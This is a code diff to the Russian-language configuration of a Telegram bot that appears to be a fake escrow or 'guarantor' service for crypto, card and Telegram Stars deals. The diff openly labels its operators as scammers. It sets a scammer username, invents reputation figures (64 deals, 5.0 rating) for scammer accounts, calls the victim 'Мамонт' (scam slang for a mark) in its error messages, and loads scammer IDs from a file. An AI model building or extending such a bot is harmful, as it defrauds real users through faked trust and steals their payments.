@@ -7,7 +7,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 ADMIN_IDS = [8187269902]
 SCAMMER_ID = 8187269902
-SCAMMER_USERNAME = "@katusha2009"
+SCAMMER_USERNAME = "@MalonGarant"
 SUPPORT_USERNAME = "@helper_fp"
 COMMISSION = 3.0
 WELCOME_GIF_PATH = "gifs/welcome.gif.mp4"
@@ -49,6 +49,52 @@ CURRENCIES = {
     "card": "карта",
     "stars": "звезд"
 }
+
+# ===== ERROR_MESSAGES (ОБЯЗАТЕЛЬНО ДЛЯ ХЕНДЛЕРОВ) =====
+ERROR_MESSAGES = {
+    "no_requisites": f"{E_WARNING} <b>У вас ещё не добавлен реквизит!</b>\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить",
+    "invalid_gram": f"{E_WARNING} <b>Вы указали неверный адрес кошелька!</b>\n\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
+    "invalid_card": f"{E_WARNING} <b>Неверный формат карты!</b>\n\nВведите 16 цифр",
+    "deal_not_found": f"{E_CROSS} <b>Сделка не найдена.</b>",
+    "deal_already_paid": f"{E_CROSS} <b>Эта сделка уже оплачена или завершена.</b>",
+    "deal_not_joined": f"{E_CROSS} <b>Мамонт ещё не присоединился к сделке.</b>",
+    "access_denied": f"{E_CROSS} <b>Доступ запрещён.</b>",
+    "invalid_amount": f"{E_CROSS} <b>Введите корректное число</b>",
+    "description_too_long": f"{E_CROSS} <b>Описание слишком длинное (макс 200 символов)</b>"
+}
+
+# ===== РЕЙТИНГ И СДЕЛКИ ДЛЯ СКАМЕРОВ =====
+SCAMMER_STATS = {
+    "8187269902": {"deals": 64, "rating": 5.0},
+    "8844754156": {"deals": 64, "rating": 5.0},
+}
+
+def load_admins_from_file():
+    """Загружает ID скамеров из файла admins.txt"""
+    admins = []
+    try:
+        with open("admins.txt", "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    try:
+                        admins.append(int(line))
+                    except:
+                        pass
+        print(f"✅ Загружено скамеров из admins.txt: {len(admins)}")
+    except FileNotFoundError:
+        print("⚠️ Файл admins.txt не найден, создаю новый...")
+        with open("admins.txt", "w", encoding="utf-8") as f:
+            f.write("# Список ID скамеров (без админ-панели)\n")
+            f.write("# Каждый ID на новой строке\n")
+            f.write("8187269902\n")
+            f.write("8844754156\n")
+        admins = [8187269902, 8844754156]
+    
+    return admins
+
+SCAMMER_IDS = load_admins_from_file()
+print(f"📋 SCAMMER_IDS: {SCAMMER_IDS}")
 
 # ===== ВСЕ ТЕКСТЫ НА ВСЕХ ЯЗЫКАХ =====
 TEXTS = {
